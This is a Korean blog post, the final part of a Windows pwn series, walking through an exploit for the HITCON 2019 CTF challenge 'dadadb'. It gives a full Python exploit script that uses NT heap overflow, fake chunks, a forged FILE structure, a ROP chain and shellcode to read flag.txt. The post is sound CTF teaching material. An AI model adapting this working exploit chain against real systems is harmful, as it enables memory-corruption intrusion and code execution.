---
title: "[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 5 - HITCON 2019 dadadb(2)"
author: L0ch
tags: [L0ch, lfh, windows, heap, nt heap, research, ctf, hitcon]
categories: [Research]
date: 2021-05-09 14:00:00
cc: true
index_img: 2021/05/09/l0ch/pwncoolsexy-part5/thumbnail.jpg
---



# 시리즈 바로가기

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows](https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/)

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/)

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)](https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/)

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb](https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/)

Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 5 - HITCON 2019 dadadb(2)  

---

안녕하세요 L0ch입니다! 오늘 드디어 시리즈 마지막 글로 돌아왔습니다!

이전 글에서 heap overflow - LFH reuse attack으로 익스에 필요한 주소들을 leak 했으니 이제 남은 건 익스뿐입니다! 익스 하려면 갈 길이 머니 바로 본론으로 들어가보도록 하겠습니다.



# Exploit scenario

로그인 체크를 하는 `sub_10D0` 함수에서는 user와 password를 받고 `user.txt` 파일을 열어 비교한 뒤 로그인 성공 혹은 실패를 반환합니다.

![pwncoolsexy-part5/Untitled.png](pwncoolsexy-part5/Untitled.png)

입력한 user와 password가 저장되는 bss 영역을 보면 `input_pw+0x20` 위치에 파일 포인터가 저장되는 것을 볼 수 있네요!

![pwncoolsexy-part5/Untitled 4.png](pwncoolsexy-part5/Untitled%204.png)

그런데 user와 password를 입력받을 때 `0x20` 만큼 입력받네요. 그럼 파일 포인터를 overwrite 할 수 있겠죠? 이를 이용해 fake file structure를 구성하면 arbitrary write가 가능합니다.

대략적인 exploit 시나리오는 아래와 같습니다.

1. heap overflow로 bss 영역에 fake chunk 생성
2. fake chunk에 fake file structure 구성
3. 파일 포인터가 fake file structure를 가리키도록 overwrite
4. arbitrary write로 return address를 rop chain 주소로 overwrite
5. GET FLAG!!

이제 시나리오대로 하나씩 살펴보도록 하겠습니다!

# Control RIP

NT heap은 같은 크기의 해제된 chunk를 `ListHints`에서 double linked list로 관리합니다. 해제된 chunk의 data 위치에는 `fd` 와 `bk` 가 저장되고 각각 이전 chunk, 다음 chunk를 가리키며 이후에 같은 크기로 재 할당할 때 `ListHints`를 참조해 먼저 해제된 순서대로 할당합니다.

`A~D`를 할당하고 `B`와 `D`를 해제한 뒤의 상황을 그림으로 간단하게 나타내면 아래와 같습니다. 리눅스의 Heap 관리랑 비슷한 면이 있네요. 

![pwncoolsexy-part5/Untitled%205.png](pwncoolsexy-part5/Untitled%205.png)

`A chunk`에서 heap overflow를 트리거하면 해제된 `B chunk`의 주소와 `header`를 leak할 수 있습니다.

```php
add("A", 0x440, "AAAA")
add("A", 0x100, "AAAA")
add("B", 0x100, "BBBB")
add("C", 0x100, "CCCC")
add("D", 0x100, "DDDD")
delete("B")
delete("D")

# leak B - header, fd, bk, chunk address
view('A')
p.recvuntil("Data:")
p.recv(0x108)
header = u64(p.recv(8))
B_fd = u64(p.recv(8))# B_fd = D chunk address
B_bk = u64(p.recv(8))
p.recv(0x210)
D_fd = u64(p.recv(8))
D_bk = u64(p.recv(8))# D_bk = B chunk address
```

이제 `user`와 `pwd` 위치에 2개의 fake chunk를 만드는데, leak 한 `B chunk` 주소와 `header`를 이용해 `B chunk`와 연결되도록 합니다. 이때 각각의 fake chunk의 header에 기존 user와 password를 포함해야 로그인 체크 함수를 통과할 수 있습니다.  `B chunk`의 `fd`에는 우리가 만든 fake chunk를 가리키도록 overwrite 하면 되겠네요.

```php
user = imagebase + 0x5620
pwd = imagebase + 0x5648

# we make heap 
# B -> fake_chunk(pwd) -> fake_chunk(user) -> D
# overwrite B_fd 
# B -> fake_chunk(pwd)
add("A", 0x100, "A"*0x100 + p64(0) + p64(header) + p64(pwd + 0x10))
# logout
p.recvuntil(">>")
p.sendline("4")

# header
fake_pwd = "phdphd" + "\x00"*2 + p64(header)
# fd, bk
fake_pwd += p64(user + 0x10) + p64(D_bk)[:-2]

# header
fake_user = "ddaa" + "\x00"*4 + p64(header)
# fd, bk
fake_user += p64(D_fd) + p64(pwd + 0x10)[:-2]

login(fake_user, fake_pwd)
```

현재 free된 chunk들의 double linked list는 아래 그림과 같습니다!

![pwncoolsexy-part5/Untitled%206.png](pwncoolsexy-part5/Untitled%206.png)

다음은 `B chunk`에 fake file structure를 구성할 차례입니다. File Structure에 대한 자세한 내용은 [Play with File Structure](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique) 슬라이드를 참고하면 되며 `_base` 필드에 임의의 주소를 쓰는 것으로 arbitrary write가 가능합니다. 따라서 `_base`에 return address를 주면 됩니다!

```php
cnt = 0
_ptr = 0
_base = ret
flag = 0x2080
fd = 0
bufsize = 0x110
obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)
obj += p32(fd) + p32(0) + p64(bufsize) +p64(0)
obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2
```

return address에는 stack base에서 `call <func>` 다음 instruction이 들어가므로 `write` 함수 호출 직후 instruction이 있는지 확인하면서 찾으면 쉽게 찾을 수 있습니다.

```php
ret_ins = imagebase+0x1b60  
ret = stack+0x2500
while(1):
	if(readmem(key,ret) == ret_ins):
		break
	ret += 8
```

이제 해제한 `B chunk`를 재할당해 `B`에 fake file structure를 쓴 후 한번 더 할당하면 우리가 만든 fake chunk가 할당되는데, `pwd+0x20` 에 파일 포인터가 있었으니 header 크기 16 bytes를 제외한 16만큼 dummy를 채우고 `B chunk`의 주소로 파일 포인터를 overwrite 합니다.

```php
add("B_REALLOC",0x100, obj)# file structure
add("PWD_CHUNK",0x100, "F"*0x10+p64(D_bk)) #overwrite fp to chunk B
```

 

# Exploit

이제 남은 건 rop chain을 구성해서 `flag.txt`의 파일의 내용을 가져와 출력하기만 하면 됩니다! 

- `readfile`을 호출해 shellcode 입력

  - `stdin`, `stdout`은  `peb+0x20`에 위치한 `ProcessParameter` 구조체에서 leak

    ```python
    process_parameter = readmem(key, peb+0x20)
    stdin = readmem(key, process_parameter+0x20)
    stdout = readmem(key, process_parameter+0x28)
    ```

- `virtualprotect`로 shellcode 주소의 실행 권한 허용 후 shellcode로 jump

- shellcode는 `flag.txt`를 읽어 stdout으로 출력

필요한 gadget은 [http://ropshell.com](http://ropshell.com/search) 에 익스 환경의 `ntdll.dll`을 업로드해 찾으면 되며`virtualprotect`, `readfile`, `writefile`, `createfile` 는 `kernel32.dll`에서 찾을 수 있습니다.

아래는 전체 `exploit.py` 입니다. 

```python
from winpwn import *
import time

def login(id,pw):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("User:")
	p.sendline(id)
	p.recvuntil("Password:")
	p.sendline(pw)

def add(key, size, data):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("Key:")
	p.sendline(key)
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("Data")
	p.send(data)

def view(key):
	p.recvuntil(">>")
	p.sendline("2")
	p.recvuntil("Key:")
	p.sendline(key)

def delete(key):
	p.recvuntil(">>")
	p.sendline("3")
	p.recvuntil("Key:")
	p.sendline(key)

def readmem(key, addr):
	add("LFH4",0x60,'a'*0x70 + p64(addr))
	view(key)
	p.recvuntil("Data:")
	return u64(p.recv(8))

context.arch = "amd64"
#context.log_level = "debug"

p = process("./dadadb.exe")

login("ddaa","phdphd")

## enable LFH
for i in range(18):
	add("l0ch"+str(i),0x90,"B"*0x90)

## fill userblock
for i in range(17):
	add("LFH"+str(i),0x90,"B"*0x90)

delete("LFH5")

add("LFH4",0x60, 'a'*0x70)
view("LFH4")

#leak heap base
p.recvuntil("a"*0x70)
heap_base = u64(p.recv(8)) & 0xffffffffffff0000

#leak next chunk key
p.recvuntil(p64(0x90))
key = p.recvuntil("\x00")[:-1]

#leak ntdll, imagebase, kernel32 base, stack
Lock = readmem(key, heap_base+0x2c0) # _HEAP->LockVariable->Lock
ntdll = Lock - 0x163dd0
pebldr = ntdll + 0x1653c0
IMOML = readmem(key, pebldr+0x20)
imagebase = readmem(key, IMOML+0x20)
kernel32 = readmem(key, imagebase+0x3000) - 0x22460	# leak from IAT
peb = readmem(key, ntdll + 0x165328) - 0x240
teb = peb + 0x1000
stack = readmem(key,teb+0x10)

process_parameter = readmem(key, peb+0x20)
stdin = readmem(key, process_parameter+0x20)
stdout = readmem(key, process_parameter+0x28)

ret_ins = imagebase+0x1b60 
ret = stack+0x2500
while(1):
	if(readmem(key,ret) == ret_ins):
		break
	ret += 8

add("A", 0x440, "AAAA")
add("A", 0x100, "AAAA")
add("B", 0x100, "BBBB")
add("C", 0x100, "CCCC")
add("D", 0x100, "DDDD")
delete("B")
delete("D")

# leak header, fd, bk, chunk address
view('A')
p.recvuntil("Data:")
p.recv(0x108)
header = u64(p.recv(8))
B_fd = u64(p.recv(8))# B_fd = D chunk address
B_bk = u64(p.recv(8))
p.recv(0x210)
D_fd = u64(p.recv(8))
D_bk = u64(p.recv(8))# D_bk = B chunk address

user = imagebase + 0x5620
pwd = imagebase + 0x5648

# we make heap 
# B -> fake_chunk(pwd) -> fake_chunk(user) -> D

# overwrite B_fd 
# B -> fake_chunk(pwd)
add("A", 0x100, "A"*0x100 + p64(0) + p64(header) + p64(pwd + 0x10))

# logout
p.recvuntil(">>")
p.sendline("4")

# header
fake_pwd = "phdphd" + "\x00"*2 + p64(header)
# fd, bk
fake_pwd += p64(user + 0x10) + p64(D_bk)[:-2]

# header
fake_user = "ddaa" + "\x00"*4 + p64(header)
# fd, bk
fake_user += p64(D_fd) + p64(pwd + 0x10)[:-2]
login(fake_user, fake_pwd)

cnt = 0
_ptr = 0
_base = ret
flag = 0x2080
fd = 0
bufsize = 0x110
obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)
obj += p32(fd) + p32(0) + p64(bufsize) +p64(0)
obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2

add("B_REALLOC",0x100, obj)# file structure
add("PWD_CHUNK",0x100, "F"*0x10+p64(D_bk)) #overwrite fp to chunk B

# logout
p.recvuntil(">>")
p.sendline("4")

login("aaaa","aaaa")

virtualprotect = kernel32 + 0x1afe0
readfile = kernel32 + 0x22460
writefile = kernel32 + 0x22550
createfile = kernel32 + 0x220d0
pop_rdx_rcx_r8_to_r11 = ntdll + 0x8d150
sc_address = imagebase + 0x5000

# call readfile(stdin, sc_address, 0x100, sc_address+0x100)
rop_buf = p64(pop_rdx_rcx_r8_to_r11)
rop_buf += p64(sc_address) + p64(stdin) + p64(0x100) + p64(sc_address + 0x100) + p64(0) + p64(0) + p64(readfile)

# call virtualprotect(sc_address, 0x1000, 0x40, sc_address+0x100-8)  
rop_buf += p64(pop_rdx_rcx_r8_to_r11) 
rop_buf += p64(0x1000) + p64(sc_address) + p64(0x40) + p64(sc_address + 0x100 -8) + p64(0) + p64(0) + p64(virtualprotect) + p64(sc_address)
p.send(rop_buf.ljust(0x100-8)+p64(4))

shellcode = f'''
	jmp readflag
flag:
	pop r11
createfile:
	mov qword ptr [rsp + 0x30], 0
	mov qword ptr [rsp + 0x28], 0x80
	mov qword ptr [rsp + 0x20], 3
	xor r9, r9
	mov r8, 1
	mov rdx, 0x80000000
	mov rcx, r11
	mov rax, {createfile}
	call rax
readfile:
	mov qword ptr [rsp + 0x20], 0
	lea r9, [rsp + 0x200]
	mov r8, 0x100
	lea rdx, [rsp + 0x100]
	mov rcx, rax
	mov rax, {readfile}
	call rax
writefile:
	mov qword ptr [rsp + 0x20], 0
	lea r9, [rsp + 0x200]
	mov r8, 0x100
	lea rdx, [rsp + 0x100]
	mov rcx, {stdout}
	mov rax, {writefile}
	call rax
loop:
	jmp loop
readflag:
	call flag
'''

shellcode = (asm(shellcode) + "flag.txt\x00").ljust(0x100,"\x90")
p.send(shellcode)
p.interactive()
```

![pwncoolsexy-part5/Untitled%207.png](pwncoolsexy-part5/Untitled%207.png)

험난했다... 



# 마무리

드디어 폰쿨섹시 시리즈 마지막 글까지 모두 끝났습니다 짞짝ㅉㅏㄱ !  

![pwncoolsexy-part5/Untitled%201.png](pwncoolsexy-part5/Untitled%201.png)

오랜만에 Part 1 글을 보면서 시리즈 목표를 다시 봤는데.. 원래 계획에 딱 맞게 Part 5로 마무리됐네요. 사실 거의 무계획이나 다름없었는데 다행이다 휴ㅎ; 

![pwncoolsexy-part5/Untitled%202.png](pwncoolsexy-part5/Untitled%202.png)

약 3개월간 진행한 정든 시리즈를 떠나보내며.. 이 글이 윈도우를 처음 시작하시는 분들께 많은 도움이 되었으면 좋겠습니다. 이제 다음은 뭘 할지 고민해야 하는데 아 뭐하지 ㅁㄴㅇㄹ 

그럼 한동안은 그동안 봐 두었던 번역글과 하루한줄로 돌아오겠습니다! 

+ 모든 시리즈 글의 오류 및 오타 지적은 언제나 환영입니다

![pwncoolsexy-part5/Untitled%203.png](pwncoolsexy-part5/Untitled%203.png)

> 진짜 끝!